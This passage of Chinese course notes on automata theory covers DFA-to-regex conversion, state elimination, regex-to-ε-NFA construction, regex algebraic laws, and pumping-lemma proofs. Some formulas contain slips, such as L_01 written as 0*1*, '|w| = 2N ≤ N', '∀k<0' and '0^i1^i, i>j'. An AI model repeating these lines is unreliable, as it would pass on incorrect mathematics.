(R_{kk}^{\\text{不经过k}})^{\\ast} R_{kj}^{\\text{不经过k}}</script><blockquote>\n<p>不经过k指的是路径节点中除了端点，都不出现k</p>\n</blockquote>\n<p>定理3：若$L = \\boldsymbol{L}(A)$是DFA A的语言，那么存在正则表达式$R$满足$L = \\boldsymbol(R)$</p>\n<p>证明：对DFA A的状态编号，以1为开始状态，即：</p>\n<script type=\"math/tex; mode=display\">\nA = (\\lbrace 1,2...n \\rbrace, \\Sigma, \\delta, 1, F)</script><p>设正则表达式$R_{ij}^{(k)}$表示从$i$到$j$但中间节点不超过$k$全部路径的字符串集：</p>\n<script type=\"math/tex; mode=display\">\nR_{ij}^{(k)} = \\lbrace x \\vert \\hat\\delta(i,x) = j, \\ x \\text{经过的状态除了两端外都不超过k} \\rbrace</script><p><img src=\"25.png\" alt=\"\"><br>那么，与$A = (\\lbrace 1,2…n \\rbrace, \\Sigma, \\delta, 1, F)$等价的正则表达式为：</p>\n<script type=\"math/tex; mode=display\">\n\\bigcup_{j \\in F}R_{ij}^{(n)}</script><p>其递归式为</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nR_{ij}^{(k)} & = R_{ij}^{(k-1)} + R_{ik}^{(k-1)}(R_{kk}^{(k-1)})^{\\ast} \\cdot R_{kj}^{(k-1)} \\\\\nR_{ij}^{(0)} & = \n\\begin{cases}\n\\lbrace a \\vert \\delta(q_i,a) = q_j \\rbrace & i \\not= j \\\\\n\\lbrace a \\vert \\delta(q_i,a) = q_j \\rbrace \\cup \\lbrace \\epsilon \\rbrace & i = j \\\\\n\\end{cases}\n\\end{aligned}</script><p>其中$R<em>{ij}^{(k-1)}$表示不经过$k$的，$R</em>{ik}^{(k-1)}(R<em>{kk}^{(k-1)})^{\\ast} R</em>{kj}^{(k-1)}$表示经过$k$的。$k$为0时，则表示直连。</p>\n<p>下面对$k$归纳，证明可以用上递归式求得$R_{ij}^{(k)}$：</p>\n<p>归纳基础：<br>当$i \\not= j, k = 0$时，即$i$到$j$没经过任何中间节点</p>\n<ul>\n<li>没有$i$到$j$的状态转移： $R_{ij}^{(0)} = \\emptyset$<br><img src=\"26.png\" alt=\"\"></li>\n<li>有一个$i$到$j$的状态转移：$R_{ij}^{(0)} = \\boldsymbol{a}$<br><img src=\"27.png\" alt=\"\"></li>\n<li>有多个$i$到$j$的状态转移：$R_{ij}^{(0)} = \\boldsymbol{a_1} + \\boldsymbol{a_2} + … + \\boldsymbol{a_t}$<br><img src=\"28.png\" alt=\"\"></li>\n</ul>\n<p>当$i = j, k = 0$时，即$i$到自身没经过任何中间节点</p>\n<ul>\n<li>状态$i$没有到自己状态转移： $R_{ii}^{(0)} = \\emptyset$<br><img src=\"29.png\" alt=\"\"></li>\n<li>状态$i$有一个到自身的状态转移：$R_{ii}^{(0)} = \\boldsymbol{a} + \\boldsymbol{\\epsilon}$<br><img src=\"30.png\" alt=\"\"></li>\n<li>状态$i$有多个到自身的状态转移：$R_{ii}^{(0)} = \\boldsymbol{a_1} + \\boldsymbol{a_2} + … + \\boldsymbol{a_t} + \\boldsymbol{\\epsilon} $<br><img src=\"31.png\" alt=\"\"></li>\n</ul>\n<p>即$k = 0$时：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{cases}\n\\lbrace a \\vert \\delta(q_i,a) = q_j \\rbrace & i \\not= j \\\\\n\\lbrace a \\vert \\delta(q_i,a) = q_j \\rbrace \\cup \\lbrace \\epsilon \\rbrace & i = j \\\\\n\\end{cases}</script><p>归纳假设：<br>已知$R<em>{ij}^{(k-1)}$是从$i$到$j$但中间节点不超过$k-1$的全部路径，同理已知$R</em>{ik}^{(k-1)}$，$R<em>{kk}^{(k-1)}$和$R</em>{kj}^{(k-1)}$。</p>\n<p>归纳地推：那么$R_{ij}^{(k)}$中全部路径，可用节点$k$分为两部分</p>\n<ul>\n<li>从$i$到$j$不经过$k$的：$R<em>{ij}^{(k)} = R</em>{ij}^{(k-1)}$<br><img src=\"32.png\" alt=\"\"></li>\n<li>从$i$到$j$经过$k$的：$R<em>{ij}^{(k)} = R</em>{ik}^{(k-1)} (R<em>{kk}^{(k-1)})^{\\ast} R</em>{kj}^{(k-1)}$<br><img src=\"32.png\" alt=\"\"></li>\n</ul>\n<p>因此：$R<em>{ij}^{(k)} = R</em>{ij}^{(k-1)} + R<em>{ik}^{(k-1)}(R</em>{kk}^{(k-1)})^{\\ast} R_{kj}^{(k-1)}$</p>\n<p>例：将如图DFA转化为正则表达式：<br><img src=\"34.png\" alt=\"\"></p>\n<p>共有两个节点，先计算$R_{ij}^{(0)}$</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>$R_{ij}^(k)$</th>\n<th>$k=0$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$R_{11}^{(0)}$</td>\n<td>$\\epsilon + \\boldsymbol{1}$</td>\n</tr>\n<tr>\n<td>$R_{12}^{(0)}$</td>\n<td>$\\boldsymbol{0}$</td>\n</tr>\n<tr>\n<td>$R_{21}^{(0)}$</td>\n<td>$\\emptyset$</td>\n</tr>\n<tr>\n<td>$R_{22}^{(0)}$</td>\n<td>$\\epsilon + \\boldsymbol{0} + \\boldsymbol{1}$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>计算$R_{ij}^{(1)}$</p>\n<script type=\"math/tex; mode=display\">\nR_{ij}^{(1)} = R_{ij}^{(0)} + R_{i1}^{(0)} (R_{11}^{(0)})^{\\ast} R_{1j}^{(0)}</script><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>$R_{ij}^{(k)}$</th>\n<th>$k=1$</th>\n<th>化简</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$R_{11}^{(1)}$</td>\n<td>$(\\epsilon + \\boldsymbol{1}) + (\\epsilon + \\boldsymbol{1}) (\\epsilon + \\boldsymbol{1})^{\\ast} (\\epsilon + \\boldsymbol{1})$</td>\n<td>$\\boldsymbol{1}^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{12}^{(1)}$</td>\n<td>$\\boldsymbol{0} + (\\epsilon + \\boldsymbol{1})(\\epsilon + \\boldsymbol{1})^{\\ast} \\boldsymbol{0}$</td>\n<td>$\\boldsymbol{1}^{\\ast}\\boldsymbol{0}$</td>\n</tr>\n<tr>\n<td>$R_{21}^{(1)}$</td>\n<td>$\\emptyset + \\emptyset (\\epsilon + \\boldsymbol{1})^{\\ast} (\\epsilon + \\boldsymbol{1})$</td>\n<td>$\\emptyset$</td>\n</tr>\n<tr>\n<td>$R_{22}^{(1)}$</td>\n<td>$\\epsilon + \\boldsymbol{0} + \\boldsymbol{1} + \\emptyset (\\epsilon + \\boldsymbol{1})^{\\ast} \\boldsymbol{0}$</td>\n<td>$\\emptyset + \\boldsymbol{0} + \\boldsymbol{1}$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>计算$R_{ij}^{(2)}$</p>\n<script type=\"math/tex; mode=display\">\nR_{ij}^{(2)} = R_{ij}^{(1)} + R_{i2}^{(1)} (R_{22}^{(1)})^{\\ast} R_{2j}^{(1)}</script><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>$R_{ij}^(k)$</th>\n<th>$k=2$</th>\n<th>化简</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$R_{11}^{(2)}$</td>\n<td>$\\boldsymbol{1}^{\\ast} + \\boldsymbol{1}^{\\ast}\\boldsymbol{0} (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\emptyset$</td>\n<td>$\\boldsymbol{1}^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{12}^{(2)}$</td>\n<td>$\\boldsymbol{1}^{\\ast} \\boldsymbol{0} + \\boldsymbol{1}^{\\ast} \\boldsymbol{0} (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})^{\\ast} (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})$</td>\n<td>$\\boldsymbol{1}^{\\ast} \\boldsymbol{0} (\\boldsymbol{0} + \\boldsymbol{1})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{21}^{(2)}$</td>\n<td>$\\emptyset + (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})(\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\emptyset$</td>\n<td>$\\emptyset$</td>\n</tr>\n<tr>\n<td>$R_{22}^{(2)}$</td>\n<td>$\\epsilon + \\boldsymbol{1} + \\boldsymbol{1} + (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})(\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})^{\\ast} (\\epsilon + \\boldsymbol{0} + \\boldsymbol{1})$</td>\n<td>$(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast}$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>因为只有$q<em>2$是接收状态，所以该DFA正则表达式为$R</em>{12}^{(2)} = \\boldsymbol{1}^{\\ast}\\boldsymbol{0}(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast}$</p>\n<p><strong>几个基本的化简原则</strong>：<br>如果$\\boldsymbol{r}$和$\\boldsymbol{s}$是两个正则表达式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(\\epsilon + \\boldsymbol{r})^{\\ast} &= \\boldsymbol{r}^{\\ast} \\\\\n(\\epsilon + \\boldsymbol{r}) \\boldsymbol{r}^{\\ast} &= \\boldsymbol{r}^{\\ast} \\\\\n\\boldsymbol{r} + \\boldsymbol{rs}^{\\ast} &= \\boldsymbol{rs}^{\\ast} \\\\\n\\emptyset\\boldsymbol{r} &= \\boldsymbol{r}\\emptyset = \\emptyset \\ \\text{零元} \\\\\n\\emptyset + \\boldsymbol{r} &= \\boldsymbol{r} + \\emptyset = \\boldsymbol{r} \\ \\text{单位元} \\\\\n\\end{aligned}</script><p>例：将如图DFA转换成正则表达式<br><img src=\"30.png\" alt=\"\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>$k=0$</th>\n<th>$k=1$</th>\n<th>$k=2$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$R_{11}^{(k)}$</td>\n<td>$\\epsilon$</td>\n<td>$\\epsilon$</td>\n<td>$(\\boldsymbol{00})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{12}^{(k)}$</td>\n<td>$\\boldsymbol{0}$</td>\n<td>$\\boldsymbol{0}$</td>\n<td>$\\boldsymbol{0}(\\boldsymbol{00})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{13}^{(k)}$</td>\n<td>$\\boldsymbol{1}$</td>\n<td>$\\boldsymbol{1}$</td>\n<td>$\\boldsymbol{0}^{\\ast}\\boldsymbol{1}$</td>\n</tr>\n<tr>\n<td>$R_{21}^{(k)}$</td>\n<td>$\\boldsymbol{0}$</td>\n<td>$\\boldsymbol{0}$</td>\n<td>$\\boldsymbol{0}(\\boldsymbol{00})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{22}^{(k)}$</td>\n<td>$\\epsilon$</td>\n<td>$\\epsilon + \\boldsymbol{00}$</td>\n<td>$(\\boldsymbol{00})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{23}^{(k)}$</td>\n<td>$\\boldsymbol{1}$</td>\n<td>$\\boldsymbol{1}+\\boldsymbol{01}$</td>\n<td>$(\\boldsymbol{0})^{\\ast}\\boldsymbol{1}$</td>\n</tr>\n<tr>\n<td>$R_{31}^{(k)}$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n<td>$(\\boldsymbol{0}+\\boldsymbol{1})(\\boldsymbol{00})^{\\ast}\\boldsymbol{0}$</td>\n</tr>\n<tr>\n<td>$R_{32}^{(k)}$</td>\n<td>$\\boldsymbol{0} + \\boldsymbol{1}$</td>\n<td>$\\boldsymbol{0} + \\boldsymbol{1}$</td>\n<td>$(\\boldsymbol{0}+\\boldsymbol{1})(\\boldsymbol{00})^{\\ast}$</td>\n</tr>\n<tr>\n<td>$R_{33}^{(k)}$</td>\n<td>$\\epsilon$</td>\n<td>$\\epsilon$</td>\n<td>$\\epsilon + (\\boldsymbol{0}+\\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1}$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nR_{12}^{(3)} & = R_{12}^{(2)} + R_{13}^{(2)} (R_{33}^{(2)})^{\\ast} R_{32}^{(2)} \\\\\n & = \\boldsymbol{0}(\\boldsymbol{00})^{\\ast} + \\boldsymbol{0}^{\\ast}\\boldsymbol{1}(\\epsilon + (\\boldsymbol{0} + \\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1})^{\\ast} (\\boldsymbol{0} + \\boldsymbol{1}))(\\boldsymbol{00})^{\\ast} \\\\\n & = \\boldsymbol{0}(\\boldsymbol{00})^{\\ast} + \\boldsymbol{0}^{\\ast}\\boldsymbol{1}((\\boldsymbol{0}+\\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1})^{\\ast}(\\boldsymbol{0}+ \\boldsymbol{1})(\\boldsymbol{00})^{\\ast} \\\\\n\\end{aligned}\n\n\\begin{aligned}\nR_{13}^{(3)} & = R_{13}^{(2)} + R_{13}^{(2)} (R_{33}^{(2)})^{\\ast} R_{33}^{(2)} \\\\\n & = \\boldsymbol{0}^{\\ast}\\boldsymbol{1} + \\boldsymbol{0}^{\\ast}\\boldsymbol{1}(\\epsilon + (\\boldsymbol{0} + \\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1})^{\\ast}(\\epsilon + (\\boldsymbol{0} + \\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1}) \\\\\n & = \\boldsymbol{0}^{\\ast}\\boldsymbol{1}((\\boldsymbol{0} + \\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1})^{\\ast} \\\\\n\\end{aligned}</script><script type=\"math/tex; mode=display\">\nR_{12}^{(3)} + R_{13}^{(3)} =  \\boldsymbol{0}^{\\ast}\\boldsymbol{1}((\\boldsymbol{0} + \\boldsymbol{1})\\boldsymbol{0}^{\\ast}\\boldsymbol{1})^{\\ast} （\\epsilon + (\\boldsymbol{0} + \\boldsymbol{1})(\\boldsymbol{00})^{\\ast}) + \\boldsymbol{0}(\\boldsymbol{00})^{\\ast} \\\\</script><h3 id=\"状态消除法\"><a href=\"#状态消除法\" class=\"headerlink\" title=\"状态消除法\"></a>状态消除法</h3><ul>\n<li>从DFA中逐个删除状态</li>\n<li>每次删除一个状态，用标记了正则表达式的新路径替换被删掉的路径</li>\n<li>保持自动机等价</li>\n</ul>\n<p>基本的几种情况：<br><img src=\"35.png\" alt=\"\"></p>\n<p>对于更一般的情况：<br><img src=\"36.png\" alt=\"\"><br>若要除掉S，除去loop边，S有2出2进，所以要补4条边</p>\n<blockquote>\n<p>状态递归表达式法相比，状态消除法不适合计算机来实现，而且不适用于太复杂的场景</p>\n</blockquote>\n<p>例：利用状态消除法，构造下图DFA的正则表达式。<br> <img src=\"37.png\" alt=\"\"></p>\n<ul>\n<li>利用空只能由，添加新的开始状态$s$和结束状态$f$。如果有多个结束状态，则全部通过空转移跳到$f$ <img src=\"38.png\" alt=\"\"></li>\n<li>消除状态$q_1$，添加$q_0 \\to q_2$和$q_2 \\to q_2$的路径 <img src=\"39.png\" alt=\"\"></li>\n<li>消除状态$q_0$，添加$s \\to q_2$和$q_2 \\to q_2$的路径 <img src=\"40.png\" alt=\"\"></li>\n<li><p>消除状态$q_2$，添加$s \\to f$的路径 <img src=\"41.png\" alt=\"\"></p>\n<p>因此，该DFA对应的正则表达式是：$\\boldsymbol{1}^{\\ast}\\boldsymbol{00}^{\\ast}\\boldsymbol{1}(\\boldsymbol{00}^{\\ast}\\boldsymbol{1}+\\boldsymbol{11}^{\\ast}\\boldsymbol{00}^{\\ast}\\boldsymbol{1})^{\\ast}$</p>\n</li>\n</ul>\n<h2 id=\"正则表达式到DFA\"><a href=\"#正则表达式到DFA\" class=\"headerlink\" title=\"正则表达式到DFA\"></a>正则表达式到DFA</h2><p><strong>定理</strong>：正则表达式定义的语言，都可以被有穷自动机识别</p>\n<p>由正则表达式构造$\\epsilon-$NFA:<br>任何正则表达式$\\boldsymbol{e}$，都存在与其等价的$\\epsilon-$NFA A，即$L(A) = L(e)$，并且A满足：</p>\n<ul>\n<li>仅有一个接受状态</li>\n<li>没有进入开始状态的边</li>\n<li>没有离开接受状态的边</li>\n</ul>\n<p>证明：对于正则表达式使用归纳法：</p>\n<p>归纳基础：<br> 对于$\\emptyset$，有$\\epsilon-$NFA <img src=\"42.png\" alt=\"\"></p>\n<ul>\n<li>对于$\\boldsymbol{\\epsilon}$，有$\\epsilon-$NFA <img src=\"43.png\" alt=\"\"></li>\n<li>对于$\\forall a \\in \\Sigma$，对于$\\boldsymbol{a}$，有$\\epsilon-$NFA <img src=\"44.png\" alt=\"\"></li>\n</ul>\n<p>归纳递推：若$\\boldsymbol{r}$和$\\boldsymbol{s}$为正则表达式，则他们对应的$\\epsilon-$NFA分别为$R$和$S$:<br><img src=\"45.png\" alt=\"\"></p>\n<p>则正则表达式$\\boldsymbol{r}+\\boldsymbol{s}$，$\\boldsymbol{rs}$和$\\boldsymbol{r}^{\\ast}$，可由$R$和$S$分别构造如下：</p>\n<ul>\n<li>对于$\\boldsymbol{r}+ \\boldsymbol{s}$，有$\\epsilon-$NFA：<img src=\"46.png\" alt=\"\"></li>\n<li>对于$\\boldsymbol{rs}$，有$\\epsilon-$NFA：<img src=\"47.png\" alt=\"\"></li>\n<li>对于$\\boldsymbol{r}^{\\ast}$，有$\\epsilon-$NFA：<img src=\"48.png\" alt=\"\"></li>\n</ul>\n<p>例：正则表达式$(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\boldsymbol{1} (\\boldsymbol{0} + \\boldsymbol{1})$构造为$\\epsilon-$NFA。<br>根据上述规则：<br>先构造$\\boldsymbol{0}$和$\\boldsymbol{1}$：<img src=\"49.png\" alt=\"\"><br>再构造$\\boldsymbol{0} + \\boldsymbol{1}$：<img src=\"50.png\" alt=\"\"><br>再构造$(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast}$：<img src=\"51.png\" alt=\"\"><br>最后，组合成$(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\boldsymbol{1} (\\boldsymbol{0} + \\boldsymbol{1})$，结果如下：<img src=\"52.png\" alt=\"\"></p>\n<h2 id=\"正则表达式的代数定理\"><a href=\"#正则表达式的代数定理\" class=\"headerlink\" title=\"正则表达式的代数定理\"></a>正则表达式的代数定理</h2><blockquote>\n<p>用于检查一个带参数的正则表达式是否为真</p>\n</blockquote>\n<p>定义：含有变量的两个正则表达式，如果以任意语言替换其变量，二者所表示的语言仍然相同，则称这两个正则表达式等价。在这样的意义下，正则表达式满足一些代数定律。</p>\n<p>并运算：</p>\n<ul>\n<li>结合律：$(L+M)+N = L+(M+N)$</li>\n<li>交换律：$L+M=M+L$</li>\n<li>幂等律：$L+L=L$</li>\n<li>单位元：$\\emptyset + L = L + \\emptyset = L$</li>\n</ul>\n<p>连接运算：</p>\n<ul>\n<li>结合律：$(LM)N = L(MN)$</li>\n<li>单位元：$\\epsilon L=L \\epsilon = L$</li>\n<li>零元：$\\emptyset L = L \\emptyset = \\emptyset$</li>\n<li>$LM \\not= ML$</li>\n</ul>\n<p>分配律：</p>\n<ul>\n<li>$L(M+N) = LM + LN$</li>\n<li>$(M+N)L = ML + NL$</li>\n</ul>\n<p>闭包运算：</p>\n<ul>\n<li>$(L^{\\ast})^{\\ast} = L^{\\ast}$</li>\n<li>$\\emptyset ^{\\ast} = \\epsilon$</li>\n<li>$\\epsilon^{\\ast} = \\epsilon$</li>\n<li>$L^{\\ast} = L^{+} + \\epsilon$</li>\n<li>$(\\epsilon + L)^{\\ast} = L^{\\ast}$</li>\n</ul>\n<p>要判断表达式$E$和$F$是否等价，其中变量为$L_1,L_2,…,L_n$</p>\n<ul>\n<li>将变量替换为具体表达式，得正则表达式$\\boldsymbol{r}$和$\\boldsymbol{s}$，例如，替换$L_i$为$\\boldsymbol{a_i}$</li>\n<li>判断$\\boldsymbol{L}(\\boldsymbol{r}) = \\boldsymbol{L}(\\boldsymbol{s})$，如果相等则$E=F$，否则$E \\not= F$</li>\n</ul>\n<p>例：判断$(L+M)^{\\ast} = (L^{\\ast}M^{\\ast})^{\\ast}$<br>将$L$和$M$替换为$\\boldsymbol{a}$和$\\boldsymbol{b}$，因为$(\\boldsymbol{a} + \\boldsymbol{b})^{\\ast} = (\\boldsymbol{a}^{\\ast}\\boldsymbol{b}^{\\ast})^{\\ast}$，$\\boldsymbol{L}((\\boldsymbol{a} + \\boldsymbol{b})^{\\ast}) = \\boldsymbol{L}((\\boldsymbol{a}^{\\ast}\\boldsymbol{b}^{\\ast})^{\\ast})$，所以$(L+M)^{\\ast}=(L^{\\ast} M^{\\ast})^{\\ast}$</p>\n<p>例：判断$L+ML=(L+M)L$</p>\n<ul>\n<li>将$L$和$M$替换为$\\boldsymbol{a}$和$\\boldsymbol{b}$</li>\n<li>判断$\\boldsymbol{a} + \\boldsymbol{ba} = (\\boldsymbol{a} + \\boldsymbol{b})\\boldsymbol{a}$</li>\n<li>因为$aa \\not\\in \\boldsymbol{a} + \\boldsymbol{ba}$，而$aa \\in (\\boldsymbol{a} + \\boldsymbol{b})\\boldsymbol{a}$</li>\n<li>所以$\\boldsymbol{a} + \\boldsymbol{ba} \\not= (\\boldsymbol{a} + \\boldsymbol{b})\\boldsymbol{a}$，即$ L+ML \\not= (L+M)L $  </li>\n</ul>\n<blockquote>\n<p><strong>注意</strong>：这种方法仅限于判断正则表达式，否则会发生错误</p>\n</blockquote>\n<p>例：若用这种方法判断$L \\cap M \\cap N = L \\cap M$，则$\\boldsymbol{a},\\boldsymbol{b},\\boldsymbol{c}$替换$L,M,N$，有</p>\n<script type=\"math/tex; mode=display\">\n\\lbrace a \\rbrace \\cap \\lbrace b \\rbrace \\cap \\lbrace c \\rbrace = \\emptyset = \\lbrace a \\rbrace \\cap \\lbrace b \\rbrace</script><p>而显然：</p>\n<script type=\"math/tex; mode=display\">\nL \\cap M \\cap N \\not= L \\cap M</script><p>说明，该方法仅仅适用于检验带有连接/并/闭包的正则表达式的式子。</p>\n<h1 id=\"正则语言的性质\"><a href=\"#正则语言的性质\" class=\"headerlink\" title=\"正则语言的性质\"></a>正则语言的性质</h1><ul>\n<li>$L=\\lbrace 0^m 1^n \\vert m,n \\geq 0 \\rbrace$ 可以写作 $\\boldsymbol{0}^{\\ast}\\boldsymbol{1}^{\\ast}$，是正则语言</li>\n<li>$L=\\lbrace 0^m 1^n \\vert m \\geq 2,n \\geq 4 \\rbrace$ 可以写作 $\\boldsymbol{00}\\boldsymbol{0}^{\\ast}\\boldsymbol{1111}\\boldsymbol{1}^{\\ast}$，是正则语言</li>\n<li>$L=\\lbrace 0^n 1^n \\vert n \\geq 0 \\rbrace$，由于有穷自动机无法记住0的数量，并匹配等量的1，所以不是正则语言</li>\n</ul>\n<p>那么，如何用形式化的方式，识别一个语言是否是正则语言呢？</p>\n<h2 id=\"正则语言的泵引理\"><a href=\"#正则语言的泵引理\" class=\"headerlink\" title=\"正则语言的泵引理\"></a>正则语言的泵引理</h2><p><strong>定理</strong>：如果语言$L$是正则的，那么存在正整数$N$，对于$\\forall w \\in L$，只要$\\vert w \\vert \\geq N$就可以将$w$分成三部分$w = xyz$满足：</p>\n<ul>\n<li>$y \\not= \\epsilon (\\vert y \\vert \\gt 0)$</li>\n<li>$\\vert xy \\vert \\leq N$</li>\n<li>$\\forall k \\geq 0,xy^kz \\in L$</li>\n</ul>\n<blockquote>\n<p>泵引理又称Pumping Lemma，$y$像泵可以不断泵出新串。只要语言$L$确定，$N$就是确定的。泵引理是正则语言的必要条件，如果一个语言不符合泵引理，那他一定不是正则语言。</p>\n</blockquote>\n<p>证明：</p>\n<ul>\n<li>如果$L$正则，那么存在有$n$个状态DFA A使得$\\boldsymbol{L}(A) = L$</li>\n<li><p>取$w = a_1…a_m \\in L (m \\geq n)$，定义$q_i = \\hat\\delta(q_0, a_1…a_i)$<br><img src=\"53.png\" alt=\"\"></p>\n</li>\n<li><p>DFA读入$a_n$进入$q_n$，一共经历了$n+1$个状态，而DFA一共只有$n$个状态。根据鸽巢原理，必有两个状态相同，设$q_i = q_j (0 \\leq i \\lt j \\leq n)$</p>\n</li>\n<li>那么$w=xyz$如图，且有$\\forall k \\lt 0,xy^kz \\in L$:<br><img src=\"54.png\" alt=\"\"></li>\n<li>而因为$i \\lt j$所以$y \\not= \\epsilon$，（即$\\vert y \\vert \\gt 0$），因为$j \\leq n$所以$\\vert xy \\vert \\leq n$</li>\n</ul>\n<h3 id=\"泵引理的应用\"><a href=\"#泵引理的应用\" class=\"headerlink\" title=\"泵引理的应用\"></a>泵引理的应用</h3><p>例：证明$L_{01} = \\lbrace 0^{\\ast} 1^{\\ast} |vert n \\geq 0 \\rbrace$不是正则语言。</p>\n<blockquote>\n<p>利用泵引理证明语言的非正则性，需要使用反证法。</p>\n</blockquote>\n<p><strong>证明</strong>：</p>\n<ul>\n<li>假设$L_{01}$是正则的</li>\n<li>那么，存在$N \\in \\mathbb{Z}^{+}$，对$\\forall w \\in L_{01}(\\vert w \\vert) \\geq N)$满足泵引理</li>\n<li>从$L<em>{01}$中取出$w=0^N1^N$，显然$w \\in L</em>{01}$且$\\vert w \\vert = 2N \\leq N$</li>\n<li>那么，$w$可以被分成$w=xyz$，且$\\vert xy \\vert \\leq N$和$y \\not= \\epsilon$</li>\n<li>因此$y$只能是$0^m$，且$m \\gt 0$</li>\n<li>那么$xy^2z = 0^{N+m}1^N \\not \\in L<em>{01}$，而由泵引理$xy^2z \\in L</em>{01}$，矛盾</li>\n<li>所以假设不成立，$L_{01}$不是正则</li>\n</ul>\n<p>例：证明$L_{eq} = \\lbrace w \\vert w \\text{由数量相等的0和1构成} \\rbrace$不是正则</p>\n<blockquote>\n<p>上例中已经证明了$L<em>{01}$不是正则语言，而$L</em>{01} \\subseteq L<em>{eq}$，但不能说明$L</em>{eq}$也不是正则语言，因为$L_{01} \\subseteq \\Sigma^{\\ast}$</p>\n</blockquote>\n<p><strong>证明</strong>：</p>\n<ul>\n<li>假设$L_{eq}$是正则的</li>\n<li>那么，存在$N \\in \\mathbb{Z}^{+}$，对$\\forall w \\in L_{eq}(\\vert w \\vert \\geq N)$满足泵定理</li>\n<li>从$L<em>{eq}$中取$w = 0^N 1^N$，显然$w \\in L</em>{eq}$且$\\vert w \\vert = 2N \\geq N$</li>\n<li>那么，$w$可被分为$w = xyz$，且$\\vert xy \\vert \\leq N$和$y \\not= \\epsilon$</li>\n<li>因此$y$只能是$0^m$且$m \\gt 0$</li>\n<li>那么$xy^2z = 0^{N+m} 1^N \\not \\in L<em>{eq}$，而由泵引理$xy^2z \\in L</em>{eq}$矛盾</li>\n<li>所以假设不成立，$L_{eq}$不是正则的</li>\n</ul>\n<p>例：证明$L = \\lbrace 0^i1^i \\vert i \\gt j \\rbrace$不是正则的<br><strong>证明</strong>：</p>\n<ul>\n<li>假设$L$是正则的</li>\n<li>那么，存在$N \\in \\mathbb{Z}^{+}$，对$\\forall w \\in L(\\vert w \\vert \\geq N)$满足泵引理</li>\n<li>从$L$中取$w = 0^{N+1}1^N$，则$w \\in L$且$\\vert w \\vert = 2N+1 \\geq N$</li>\n<li>由泵引理，$w$可被分成$w = xyz$，且$\\vert xy \\vert \\leq N$和$y \\not= \\epsilon$</li>\n<li>那么，$y$只能是$0^m$，且$m \\geq 1$</li>\n<li>难么$xy^0z=0^{N+1-m}1^N \\not\\in L$，因为$N+1-m \\leq N$，而由泵引理$xy^0z \\in L$，矛盾</li>\n</ul>\n<blockquote>\n<p>“泵”既可以pump in，也可以pump out</p>\n</blockquote>\n<p>例：证明$L = \\lbrace a^3b^nc^{n-3} | n \\geq 3 \\rbrace$不是正则<br><strong>证明</strong>：</p>\n<ul>\n<li>假设$L$是正则的</li>\n<li>那么，存在$N \\in \\mathbb{Z}^{+}$，对$\\forall w \\in L(\\vert w \\vert \\geq N)$满足泵定理</li>\n<li>从$L$中取出$w = a^3b^Nc^{N-3}$，则$w \\in L$且$\\vert w \\vert = 2N \\gt N$</li>\n<li>由泵定理，$w$可被分别为$w = xyz$，且$\\vert xy \\vert \\leq N$和$y \\not= \\epsilon$</li>\n<li>那么，则$y$只可能有三种情况$m \\gt 0,r \\gt 0,s \\gt 0)$<ul>\n<li>$y=a^m$，则$xy^2z = a^{3+m}b^Nc^{N-3} \\not\\in L$</li>\n<li>$y=b^m$，则$xy^2z = a^{3}b^{N+m}c^{N-3} \\not\\in L$</li>\n<li>$y=a^rb^s$，则$xy^2z = a^{3}b^{s}a^{r}b^{N}c^{N-3} \\not\\in L$</li>\n</ul>\n</li>\n<li>无论$y$为何种情况，$xy^2z$都不可能再$L$中，与泵引理矛盾</li>\n<li>所以假设不成立，$L$不是正则的</li>\n</ul>\n<p><strong>注意</strong></p>\n<ul>\n<li>$L =\\lbrace 0^n 1^n \\vert 0 \\leq n \\leq 100 \\rbrace$是有穷的，是正则语言</li>\n<li>$L = \\lbrace 01 \\rbrace $这种有限的串，并没有违反泵引理。对于有限语言，任何串的长度都不可能大于$N$，所以不能用泵引理去证明他不是正则语言。</li>\n<li>泵引理只是正则语言的<strong>必要条件</strong>，只能用来证明某个语言<strong>不是</strong>正则的。与正则语言等价的定理是<em>Myhill Nerode Theorem</em></li>\n</ul>\n<p>例：语言$L$不是正则的，但每个串都可以应用泵引理</p>\n<script type=\"math/tex; 